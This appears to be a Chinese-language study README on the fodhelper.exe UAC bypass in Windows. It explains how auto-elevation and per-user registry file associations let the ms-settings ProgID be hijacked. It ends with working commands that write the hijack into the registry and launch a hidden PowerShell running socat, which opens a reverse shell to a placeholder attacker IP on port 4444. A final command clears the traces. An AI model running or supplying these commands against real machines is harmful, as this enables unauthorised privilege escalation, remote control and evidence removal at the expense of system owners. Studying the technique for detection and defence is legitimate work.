# bypassUAC_study
通过C语言实现一键化bypassUAC限制
Fodhelper.exe 是 Windows 默认可执行文件之一，负责管理 Windows 可选功能，包括附加语言、默认未安装的应用程序或其他操作系统特性。与大多数用于系统配置的程序一样，fodhelper 可以在使用默认 UAC 设置时自动提升权限，这样管理员在执行标准管理任务时就不会被提示提升权限。虽然我们已经看过 autoElevate 可执行文件，但与 msconfig 不同，fodhelper 可能会在无法访问GUI 的情况下被滥用。

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d8d6a1ca-de47-4449-8c51-cab84a415149/dfd7f5fb-76b9-48ef-a9b8-cd3fb1629005/image.png)

从攻击者的角度来看，这意味着它可以通过中等完整性远程 shell 来使用，并利用到功能齐全的高完整性进程中。这种特殊技术是由[@winscripting发现的，并已被](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)[Glupteba 恶意软件](https://www.cybereason.com/blog/glupteba-expands-operation-and-toolkit-with-lolbins-cryptominer-and-router-exploit)广泛使用。

关于 fodhelper 值得注意的是，它会在注册表中搜索感兴趣的特定键：

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d8d6a1ca-de47-4449-8c51-cab84a415149/7be1de7d-ced6-4607-82eb-f817af89afc8/image.png)

当 Windows 打开文件时，它会检查注册表以了解要使用哪个应用程序。注册表为每种文件类型保存一个称为 Programmatic ID ( **ProgID** ) 的键，其中与相应的应用程序相关联。假设您尝试打开一个 HTML 文件。将检查注册表中称为 HKEY_CLASSES_ROOT 的部分**，**以便系统知道它必须使用您首选的 Web 客户端来打开它。要使用的命令将在**`shell/open/command`**每个文件的 ProgID 子项。以“htmlfile”ProgID 为例：

![image.png](https://prod-files-secure.s3.us-west-2.amazonaws.com/d8d6a1ca-de47-4449-8c51-cab84a415149/3ef9e416-df58-40e8-a1c4-ed4de61384c6/image.png)

实际上，HKEY_CLASSES_ROOT 只是注册表上两个不同路径的合并视图：

| **小路** | **描述** |
| --- | --- |
| HKEY_LOCAL_MACHINE\Software\Classes | 系统范围的文件关联 |
| HKEY_CURRENT_USER\Software\Classes | 活跃用户的文件关联 |

**检查 HKEY_CLASSES_ROOT 时，如果HKEY_CURRENT_USER (HKCU)**处有用户特定关联，则该关联将优先。如果未配置用户特定关联，则将改用 **HKEY_LOCAL_MACHINE (HKLM)**处的系统范围关联。这样，每个用户都可以根据需要单独选择他们喜欢的应用程序。

回到 fodhelper，我们现在看到它正在尝试打开 ms-settings ProgID 下的文件。通过在 HKCU 下当前用户上下文中为该 ProgID 创建关联，我们将覆盖默认的系统范围关联，从而控制使用哪个命令来打开文件。由于 fodhelper 是 autoElevate 可执行文件，因此它生成的任何子进程都将继承高完整性令牌，从而有效地绕过UAC。

C:\> set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\command
C:\> set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"

C:\> reg add %REG_KEY% /v "DelegateExecute" /d "" /f
The operation completed successfully.

C:\> reg add %REG_KEY% /d %CMD% /f
The operation completed successfully.


清除痕迹：
reg delete HKCU\Software\Classes\ms-settings\ /f
